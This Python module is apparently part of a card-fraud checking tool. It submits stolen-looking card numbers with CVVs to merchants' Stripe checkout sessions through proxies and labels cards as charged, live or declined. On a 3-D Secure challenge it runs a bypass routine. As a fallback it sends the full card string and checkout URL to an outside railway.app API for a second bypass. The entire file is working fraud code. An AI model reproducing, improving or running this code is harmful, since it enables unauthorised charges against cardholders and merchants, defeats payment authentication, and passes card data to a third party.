import time
import asyncio
import logging
import aiohttp
from .bypass_3ds import try_3ds_bypass

logger = logging.getLogger(__name__)

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

API_URL = "https://web-production-2f61.up.railway.app"

async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, session: aiohttp.ClientSession, checkout_url: str = None, proxy: str = None) -> dict:
    """Dual 3DS bypass: Try method 1 (profile rotation) first, then method 2 (API) if needed"""
    start = time.perf_counter()
    
    logger.info(f"🔧 Proxy parameter: {proxy if proxy else 'None'}")
    
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0,
        "bypass_method": None
    }
    
    try:
        # Get checkout data
        email = init_data.get("customer_email") or "john@example.com"
        checksum = init_data.get("init_checksum", "")
        
        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        if lig:
            total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
        elif inv:
            total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
        else:
            pi = init_data.get("payment_intent") or {}
            total = subtotal = pi.get("amount", 0)
        
        cust = init_data.get("customer") or {}
        addr = cust.get("address") or {}
        name = cust.get("name") or "John Smith"
        country = addr.get("country") or "US"
        line1 = addr.get("line1") or "476 West White Mountain Blvd"
        city = addr.get("city") or "Pinetop"
        state = addr.get("state") or "AZ"
        zip_code = addr.get("postal_code") or "85929"
        
        # Create payment method
        pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
        
        async with session.post("https://api.stripe.com/v1/payment_methods", headers=HEADERS, data=pm_body, proxy=proxy) as r:
            pm = await r.json()
        
        if "error" in pm:
            error_msg = pm["error"].get("message", "Card error")
            
            # Check if key is restricted
            if "unsupported for publishable key tokenization" in error_msg.lower() or "tokenization" in error_msg.lower():
                logger.info("⚠️ Restricted key detected - skipping to Method 2 (API)")
                logger.info(f"🔍 checkout_url param: {checkout_url}")
                
                # Skip Method 1, go directly to Method 2
                if checkout_url:
                    try:
                        card_str = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
                        
                        logger.info(f"🔗 Calling API: {API_URL}")
                        logger.info(f"📦 URL: {checkout_url}")
                        logger.info(f"💳 Card: {card_str}")
                        
                        async with session.get(API_URL, params={"url": checkout_url, "card": card_str}, timeout=aiohttp.ClientTimeout(total=30)) as r:
                            api_result = await r.json()
                        
                        logger.info(f"📥 API Response: {api_result}")
                        
                        api_status = api_result.get("status", "error")
                        api_msg = api_result.get("msg", "No response")
                        
                        if api_status == "charge":
                            result["status"] = "CHARGED"
                            result["response"] = f"3DS Bypassed ✅ - {api_msg}"
                            result["bypass_method"] = "method_2"
                        elif api_status == "live":
                            result["status"] = "LIVE"
                            result["response"] = api_msg
                            result["bypass_method"] = "method_2"
                        elif api_status == "dead":
                            result["status"] = "DECLINED"
                            result["response"] = api_msg
                            result["bypass_method"] = "method_2"
                        else:
                            result["status"] = "FAILED"
                            result["response"] = "Restricted checkout - API method failed"
                    except Exception as e:
                        logger.error(f"API method error: {e}")
                        result["status"] = "FAILED"
                        result["response"] = "Checkout restricted by merchant"
                else:
                    result["status"] = "FAILED"
                    result["response"] = "Checkout restricted by merchant"
                
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            
            result["status"] = "DECLINED"
            result["response"] = error_msg
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        pm_id = pm.get("id")
        if not pm_id:
            result["status"] = "FAILED"
            result["response"] = "No PM"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        # Confirm payment
        conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
        
        async with session.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=HEADERS, data=conf_body, proxy=proxy) as r:
            conf = await r.json()
        
        if "error" in conf:
            err = conf["error"]
            dc = err.get("decline_code", "")
            msg = err.get("message", "Failed")
            result["status"] = "DECLINED"
            result["response"] = f"{dc.upper()}: {msg}" if dc else msg
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        pi = conf.get("payment_intent") or {}
        st = pi.get("status", "") or conf.get("status", "")
        
        if st == "succeeded":
            result["status"] = "CHARGED"
            result["response"] = "Payment Successful"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        if st == "requires_action":
            # 3DS Challenge detected
            next_action = pi.get("next_action", {})
            use_stripe_sdk = next_action.get("use_stripe_sdk", {})
            three_ds_source = use_stripe_sdk.get("three_d_secure_2_source")
            pi_id = pi.get("id")
            pi_secret = pi.get("client_secret")
            
            if not three_ds_source:
                # Check if there's an error in payment_intent
                last_error = pi.get("last_payment_error")
                if last_error:
                    err_msg = last_error.get("message", "Card Declined")
                    err_code = last_error.get("code") or last_error.get("decline_code")
                    result["status"] = "DECLINED"
                    result["response"] = f"{err_code.upper()}: {err_msg}" if err_code else err_msg
                else:
                    result["status"] = "3DS"
                    result["response"] = "3DS Required"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            
            logger.info("🔐 3DS detected - trying Method 1 (profile rotation)")
            
            # METHOD 1: Try 3DS bypass with profile rotation
            bypass_result = await try_3ds_bypass(session, three_ds_source, pk, proxy)
            
            if bypass_result.get("success"):
                # Bypass succeeded - check payment status
                await asyncio.sleep(0.5)
                
                async with session.get(
                    f"https://api.stripe.com/v1/payment_intents/{pi_id}",
                    params={"key": pk, "client_secret": pi_secret},
                    headers=HEADERS,
                    proxy=proxy
                ) as r:
                    pi_check = await r.json()
                
                final_status = pi_check.get("status", "")
                last_error = pi_check.get("last_payment_error")
                
                if final_status == "succeeded":
                    result["status"] = "CHARGED"
                    result["response"] = f"3DS Bypassed ✅"
                    result["bypass_method"] = "method_1"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                
                if last_error:
                    dc = last_error.get("decline_code", "")
                    emsg = last_error.get("message", "Declined")
                    result["status"] = "DECLINED"
                    result["response"] = f"{dc.upper()}: {emsg}" if dc else emsg
                    result["bypass_method"] = "method_1"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                
                if final_status == "requires_payment_method":
                    result["status"] = "DECLINED"
                    result["response"] = "Card Declined"
                    result["bypass_method"] = "method_1"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
            
            # Method 1 didn't give definitive result - try Method 2
            logger.info("⚡ Method 1 inconclusive - trying Method 2 (API)")
            
            if checkout_url:
                try:
                    card_str = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
                    
                    async with session.get(API_URL, params={"url": checkout_url, "card": card_str}, timeout=aiohttp.ClientTimeout(total=30)) as r:
                        api_result = await r.json()
                    
                    api_status = api_result.get("status", "error")
                    api_msg = api_result.get("msg", "No response")
                    
                    if api_status == "charge":
                        result["status"] = "CHARGED"
                        result["response"] = f"3DS Bypassed ✅ - {api_msg}"
                        result["bypass_method"] = "method_2"
                    elif api_status == "live":
                        result["status"] = "LIVE"
                        result["response"] = api_msg
                        result["bypass_method"] = "method_2"
                    elif api_status == "dead":
                        result["status"] = "DECLINED"
                        result["response"] = api_msg
                        result["bypass_method"] = "method_2"
                    else:
                        result["status"] = "3DS FAIL"
                        result["response"] = "Both bypass methods failed"
                except Exception as e:
                    logger.error(f"Method 2 error: {e}")
                    result["status"] = "3DS FAIL"
                    result["response"] = "Both bypass methods failed"
            else:
                result["status"] = "3DS FAIL"
                result["response"] = "3DS Bypass Failed"
        
        elif st == "requires_payment_method":
            result["status"] = "DECLINED"
            result["response"] = "Card Declined"
        elif st == "open":
            result["status"] = "DECLINED"
            result["response"] = "CAPTCHA REQUIRED"
        else:
            result["status"] = "UNKNOWN"
            result["response"] = st or "Unknown"
    
    except Exception as e:
        logger.error(f"Charge error: {e}")
        result["status"] = "ERROR"
        result["response"] = str(e)[:40]
    
    result["time"] = round(time.perf_counter() - start, 2)
    return result
